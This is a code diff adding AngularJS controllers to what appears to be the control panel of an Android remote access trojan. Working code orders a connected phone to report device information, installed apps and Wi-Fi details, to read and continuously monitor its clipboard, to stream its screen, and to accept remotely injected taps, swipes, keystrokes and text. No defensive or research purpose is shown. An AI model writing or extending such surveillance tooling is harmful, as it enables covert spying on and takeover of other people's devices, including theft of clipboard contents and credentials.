+    $DeviceInfoCtrl.deviceInfo = null;
+    var deviceInfo = CONSTANTS.orders.deviceInfo;
+
+    $DeviceInfoCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(deviceInfo);
+    });
+
+    $DeviceInfoCtrl.getDeviceInfo = () => {
+        $rootScope.Log('[→] Fetching device information...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: deviceInfo });
+    };
+
+    socket.on(deviceInfo, (data) => {
+        $rootScope.Log('[✓] Device information received', CONSTANTS.logStatus.SUCCESS);
+        $DeviceInfoCtrl.deviceInfo = data;
+        $DeviceInfoCtrl.$apply();
+    });
+
+    // Auto-load on init
+    $DeviceInfoCtrl.getDeviceInfo();
+});
+
+//-----------------------Apps Controller------------------------
+app.controller("AppsCtrl", function ($scope, $rootScope) {
+    $AppsCtrl = $scope;
+    $AppsCtrl.appsList = [];
+    $AppsCtrl.load = 'loading';
+    var apps = CONSTANTS.orders.apps;
+
+    $AppsCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(apps);
+    });
+
+    $AppsCtrl.getApps = () => {
+        $AppsCtrl.load = 'loading';
+        $rootScope.Log('[→] Fetching installed apps...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: apps });
+    };
+
+    $AppsCtrl.barLimit = 50;
+    $AppsCtrl.increaseLimit = () => {
+        $AppsCtrl.barLimit += 50;
+    };
+
+    socket.on(apps, (data) => {
+        $AppsCtrl.load = '';
+        if (data.appsList) {
+            $rootScope.Log(`[✓] Apps list received: ${data.appsList.length} apps`, CONSTANTS.logStatus.SUCCESS);
+            $AppsCtrl.appsList = data.appsList;
+            $AppsCtrl.$apply();
+        }
+    });
+
+    // Auto-load on init
+    $AppsCtrl.getApps();
+});
+
+//-----------------------Clipboard Controller------------------------
+app.controller("ClipboardCtrl", function ($scope, $rootScope) {
+    $ClipboardCtrl = $scope;
+    $ClipboardCtrl.clipboardText = '';
+    $ClipboardCtrl.isMonitoring = false;
+    var clipboard = CONSTANTS.orders.clipboard;
+
+    $ClipboardCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(clipboard);
+    });
+
+    $ClipboardCtrl.getClipboard = () => {
+        $rootScope.Log('[→] Fetching clipboard content...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: clipboard, extra: 'get' });
+    };
+
+    $ClipboardCtrl.startMonitoring = () => {
+        $ClipboardCtrl.isMonitoring = true;
+        $rootScope.Log('[✓] Clipboard monitoring started', CONSTANTS.logStatus.SUCCESS);
+        socket.emit(ORDER, { order: clipboard, extra: 'start' });
+    };
+
+    $ClipboardCtrl.stopMonitoring = () => {
+        $ClipboardCtrl.isMonitoring = false;
+        $rootScope.Log('[→] Clipboard monitoring stopped', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: clipboard, extra: 'stop' });
+    };
+
+    socket.on(clipboard, (data) => {
+        if (data.hasData && data.text) {
+            $ClipboardCtrl.clipboardText = data.text;
+            if ($ClipboardCtrl.isMonitoring && data.timestamp) {
+                $rootScope.Log(`[ℹ] Clipboard changed: ${data.text.substring(0, 50)}...`, CONSTANTS.logStatus.INFO);
+            } else {
+                $rootScope.Log('[✓] Clipboard content received', CONSTANTS.logStatus.SUCCESS);
+            }
+            $ClipboardCtrl.$apply();
+        } else {
+            $ClipboardCtrl.clipboardText = '';
+            $rootScope.Log('[ℹ] Clipboard is empty', CONSTANTS.logStatus.INFO);
+            $ClipboardCtrl.$apply();
+        }
+    });
+
+    // Auto-load on init
+    $ClipboardCtrl.getClipboard();
+});
+
+//-----------------------WiFi Controller------------------------
+app.controller("WiFiCtrl", function ($scope, $rootScope) {
+    $WiFiCtrl = $scope;
+    $WiFiCtrl.wifiInfo = null;
+    var wifi = CONSTANTS.orders.wifi;
+
+    $WiFiCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(wifi);
+    });
+
+    $WiFiCtrl.getWiFiInfo = () => {
+        $rootScope.Log('[→] Fetching WiFi information...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: wifi });
+    };
+
+    socket.on(wifi, (data) => {
+        if (data.enabled) {
+            $rootScope.Log('[✓] WiFi information received', CONSTANTS.logStatus.SUCCESS);
+        } else {
+            $rootScope.Log('[⚠] WiFi is disabled on device', CONSTANTS.logStatus.WARNING);
+        }
+        $WiFiCtrl.wifiInfo = data;
+        $WiFiCtrl.$apply();
+    });
+
+    // Auto-load on init
+    $WiFiCtrl.getWiFiInfo();
+});
+
+//-----------------------Screen Controller (screen.html)------------------------
+// Remote Desktop / VNC-like Controller with Touch Input
+app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) {
+    $ScreenCtrl = $scope;
+    var screen = CONSTANTS.orders.screen || 'x0000sc';
+    var input = CONSTANTS.orders.input || 'x0000in';
+    
+    // State
+    $ScreenCtrl.isStreaming = false;
+    $ScreenCtrl.isLoading = false;
+    $ScreenCtrl.currentFrame = null;
+    $ScreenCtrl.screenInfo = { width: 1080, height: 1920 };
+    $ScreenCtrl.permissionRequired = false;
+    $ScreenCtrl.frameCount = 0;
+    $ScreenCtrl.lastFrameSize = 0;
+    $ScreenCtrl.actualFps = 0;
+    
+    // Touch control
+    $ScreenCtrl.touchEnabled = true;
+    $ScreenCtrl.lastTouchPos = null;
+    $ScreenCtrl.inputLog = [];
+    $ScreenCtrl.textToSend = '';
+    
+    // Settings
+    $ScreenCtrl.quality = '50';
+    $ScreenCtrl.fps = '250'; // ms between frames
+    
+    var streamInterval = null;
+    var canvas = null;
+    var ctx = null;
+    var fpsCounter = 0;
+    var fpsTimer = null;
+    var isDragging = false;
+    var dragStart = null;
+    
+    $ScreenCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(screen);
+        socket.removeAllListeners(input);
+        if (streamInterval) $interval.cancel(streamInterval);
+        if (fpsTimer) $interval.cancel(fpsTimer);
+    });
+    
+    // Initialize canvas
+    function initCanvas() {
+        canvas = document.getElementById('screenCanvas');
+        if (canvas) {
+            ctx = canvas.getContext('2d');
+        }
+    }
+    
+    // Get canvas coordinates normalized to screen dimensions
+    function getCanvasCoords(event) {
+        if (!canvas) return null;
+        
+        var rect = canvas.getBoundingClientRect();
+        var scaleX = canvas.width / rect.width;
+        var scaleY = canvas.height / rect.height;
+        
+        var canvasX = (event.clientX - rect.left) * scaleX;
+        var canvasY = (event.clientY - rect.top) * scaleY;
+        
+        // Normalize to 0-1 range for device screen mapping
+        var normX = canvasX / canvas.width;
+        var normY = canvasY / canvas.height;
+        
+        return {
+            x: Math.max(0, Math.min(1, normX)),
+            y: Math.max(0, Math.min(1, normY)),
+            pixelX: Math.round(canvasX),
+            pixelY: Math.round(canvasY),
+            screenX: event.clientX - rect.left,
+            screenY: event.clientY - rect.top
+        };
+    }
+    
+    // Show touch indicator
+    function showTouchIndicator(x, y) {
+        $ScreenCtrl.lastTouchPos = { x: x, y: y };
+        $timeout(() => {
+            $ScreenCtrl.lastTouchPos = null;
+        }, 500);
+    }
+    
+    // Add to input log
+    function logInput(action, detail) {
+        $ScreenCtrl.inputLog.unshift({ action: action, detail: detail });
+        if ($ScreenCtrl.inputLog.length > 10) {
+            $ScreenCtrl.inputLog.pop();
+        }
+    }
+    
+    // Render frame to canvas
+    function renderFrame(base64Image, width, height) {
+        if (!canvas || !ctx) {
+            initCanvas();
+        }
+        
+        if (!canvas || !ctx) return;
+        
+        var img = new Image();
+        img.onload = function() {
+            canvas.width = img.width;
+            canvas.height = img.height;
+            ctx.drawImage(img, 0, 0);
+            $ScreenCtrl.currentFrame = base64Image;
+            fpsCounter++;
+            
+            if (!$ScreenCtrl.$$phase) {
+                $ScreenCtrl.$apply();
+            }
+        };
+        img.src = 'data:image/jpeg;base64,' + base64Image;
+    }
+    
+    // ============ Touch/Input Handlers ============
+    
+    $ScreenCtrl.handleClick = (event) => {
+        if (!$ScreenCtrl.touchEnabled || isDragging) return;
+        
+        var coords = getCanvasCoords(event);
+        if (!coords) return;
+        
+        showTouchIndicator(coords.screenX, coords.screenY);
+        logInput('TAP', `${(coords.x * 100).toFixed(0)}%, ${(coords.y * 100).toFixed(0)}%`);
+        
+        socket.emit(ORDER, {
+            order: input,
+            action: 'tap',
+            x: coords.x,
+            y: coords.y,
+            normalized: true
+        });
+    };
+    
+    $ScreenCtrl.handleMouseDown = (event) => {
+        if (!$ScreenCtrl.touchEnabled) return;
+        dragStart = getCanvasCoords(event);
+        isDragging = false;
+    };
+    
+    $ScreenCtrl.handleMouseMove = (event) => {
+        if (!$ScreenCtrl.touchEnabled || !dragStart) return;
+        var coords = getCanvasCoords(event);
+        if (!coords) return;
+        
+        // Check if movement is significant enough to be a drag
+        var dx = Math.abs(coords.x - dragStart.x);
+        var dy = Math.abs(coords.y - dragStart.y);
+        if (dx > 0.02 || dy > 0.02) {
+            isDragging = true;
+        }
+    };
+    
+    $ScreenCtrl.handleMouseUp = (event) => {
+        if (!$ScreenCtrl.touchEnabled) return;
+        
+        if (isDragging && dragStart) {
+            var endCoords = getCanvasCoords(event);
+            if (endCoords) {
+                logInput('SWIPE', `${(dragStart.x * 100).toFixed(0)}%→${(endCoords.x * 100).toFixed(0)}%`);
+                
+                socket.emit(ORDER, {
+                    order: input,
+                    action: 'swipe',
+                    startX: dragStart.x,
+                    startY: dragStart.y,
+                    endX: endCoords.x,
+                    endY: endCoords.y,
+                    duration: 300,
+                    normalized: true
+                });
+            }
+        }
+        
+        dragStart = null;
+        isDragging = false;
+    };
+    
+    $ScreenCtrl.sendKey = (key) => {
+        logInput('KEY', key.toUpperCase());
+        socket.emit(ORDER, {
+            order: input,
+            action: 'key',
+            key: key
+        });
+    };
+    
+    $ScreenCtrl.sendText = () => {
+        if (!$ScreenCtrl.textToSend) return;
+        
+        logInput('TEXT', $ScreenCtrl.textToSend.substring(0, 20) + '...');
+        socket.emit(ORDER, {
+            order: input,
+            action: 'text',
+            text: $ScreenCtrl.textToSend
+        });
+        $ScreenCtrl.textToSend = '';
+    };
+    
+    $ScreenCtrl.handleTextKeypress = (event) => {
+        if (event.keyCode === 13) { // Enter
+            $ScreenCtrl.sendText();
+        }
+    };
+    
+    // ============ Stream Controls ============
+    
+    $ScreenCtrl.getScreenInfo = () => {
+        socket.emit(ORDER, { order: screen, extra: 'info' });
+    };
+    
+    $ScreenCtrl.startStream = () => {
+        $ScreenCtrl.isLoading = true;
+        $ScreenCtrl.frameCount = 0;
+        fpsCounter = 0;
+        $rootScope.Log('[→] Starting remote desktop stream...', CONSTANTS.logStatus.INFO);
+        
+        // Request first frame
+        socket.emit(ORDER, { order: screen, extra: 'capture' });
+        
+        // Set up polling for frames
+        streamInterval = $interval(() => {
+            if ($ScreenCtrl.isStreaming) {
+                socket.emit(ORDER, { order: screen, extra: 'capture' });
+            }
+        }, parseInt($ScreenCtrl.fps));
+        
+        // FPS counter
+        fpsTimer = $interval(() => {
+            $ScreenCtrl.actualFps = fpsCounter;
+            fpsCounter = 0;
+        }, 1000);
+        
+        $ScreenCtrl.isStreaming = true;
+    };
+    
+    $ScreenCtrl.stopStream = () => {
+        $ScreenCtrl.isStreaming = false;
+        $ScreenCtrl.isLoading = false;
+        
+        if (streamInterval) {
+            $interval.cancel(streamInterval);
+            streamInterval = null;
+        }
+        if (fpsTimer) {
+            $interval.cancel(fpsTimer);
+            fpsTimer = null;
+        }
+        $ScreenCtrl.actualFps = 0;
+        
+        $rootScope.Log('[→] Remote desktop stream stopped', CONSTANTS.logStatus.INFO);
+    };
+    
+    $ScreenCtrl.captureFrame = () => {
+        $ScreenCtrl.isLoading = true;
+        $rootScope.Log('[→] Capturing screen...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: screen, extra: 'capture' });
+    };
+    
+    $ScreenCtrl.refreshScreen = () => {
+        socket.emit(ORDER, { order: screen, extra: 'capture' });
+    };
+    
+    $ScreenCtrl.setQuality = () => {
+        socket.emit(ORDER, { order: screen, extra: 'setQuality', quality: parseInt($ScreenCtrl.quality) });
+    };
+    
+    $ScreenCtrl.setFps = () => {
+        if (streamInterval) {
+            $interval.cancel(streamInterval);
+            streamInterval = $interval(() => {
+                if ($ScreenCtrl.isStreaming) {
+                    socket.emit(ORDER, { order: screen, extra: 'capture' });
+                }
+            }, parseInt($ScreenCtrl.fps));
+        }
+    };
+    
+    $ScreenCtrl.saveScreenshot = () => {
+        if (!$ScreenCtrl.currentFrame) return;
+        
+        $rootScope.Log('[→] Saving screenshot...', CONSTANTS.logStatus.INFO);
+        
+        var base64Data = $ScreenCtrl.currentFrame;
+        var filename = 'Screenshot_' + Date.now() + '.jpg';
+        var filePath = path.join(downloadsPath, filename);
+        
+        fs.outputFile(filePath, Buffer.from(base64Data, 'base64'), (err) => {
+            if (err) {
+                $rootScope.Log('[✗] Failed to save screenshot', CONSTANTS.logStatus.FAIL);
+            } else {
+                $rootScope.Log(`[✓] Screenshot saved: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
+            }
+        });
+    };
+    
+    $ScreenCtrl.openFullscreen = () => {
+        if (!$ScreenCtrl.currentFrame) return;
+        let win = window.open('', '_blank', 'width=540,height=960');
+        win.document.write(`
+            <html>
+            <head><title>Remote Desktop - Fullscreen</title></head>
+            <body style="margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh;">
+            <img src="data:image/jpeg;base64,${$ScreenCtrl.currentFrame}" style="max-width:100%;max-height:100%;object-fit:contain;">
+            </body>
+            </html>
+        `);
+    };
+    
+    // ============ Socket Handlers ============
+    
+    socket.on(screen, (data) => {
+        $ScreenCtrl.isLoading = false;
+        
+        if (data.success === false) {
+            if (data.error && data.error.toLowerCase().includes('permission')) {
+                $ScreenCtrl.permissionRequired = true;
+                $rootScope.Log('[⚠] Screen capture permission required on device', CONSTANTS.logStatus.WARNING);
+            } else {
+                $rootScope.Log(`[✗] Screen error: ${data.error || 'Unknown'}`, CONSTANTS.logStatus.FAIL);
+            }
+            
+            if ($ScreenCtrl.isStreaming) {
+                $ScreenCtrl.stopStream();
+            }
+        } else if (data.image) {
+            $ScreenCtrl.frameCount++;
+            $ScreenCtrl.lastFrameSize = (data.size / 1024).toFixed(1);
+            $ScreenCtrl.permissionRequired = false;
+            
+            // Update screen info from frame
+            if (data.width && data.height) {
+                $ScreenCtrl.screenInfo.width = data.width;
+                $ScreenCtrl.screenInfo.height = data.height;
+            }
+            
+            renderFrame(data.image, data.width, data.height);
+            
+            if ($ScreenCtrl.frameCount === 1) {
+                $rootScope.Log('[✓] Remote desktop active', CONSTANTS.logStatus.SUCCESS);
+            }
+        } else if (data.width && data.height && !data.image) {
+            $ScreenCtrl.screenInfo = data;
+            $rootScope.Log(`[✓] Screen: ${data.width}x${data.height}`, CONSTANTS.logStatus.SUCCESS);
+        } else if (data.quality) {
+            $rootScope.Log(`[✓] Quality: ${data.quality}%`, CONSTANTS.logStatus.SUCCESS);
+        }
+        
+        if (!$ScreenCtrl.$$phase) {
+            $ScreenCtrl.$apply();
+        }
+    });
+    
+    socket.on(input, (data) => {
+        if (data.success) {
+            // Input command succeeded
+        } else {
+            $rootScope.Log(`[✗] Input failed: ${data.error || 'Unknown'}`, CONSTANTS.logStatus.FAIL);
+        }
+    });
+    
+    // Initialize
+    setTimeout(() => {
+        initCanvas();
+        $ScreenCtrl.getScreenInfo();
+    }, 100);
 });
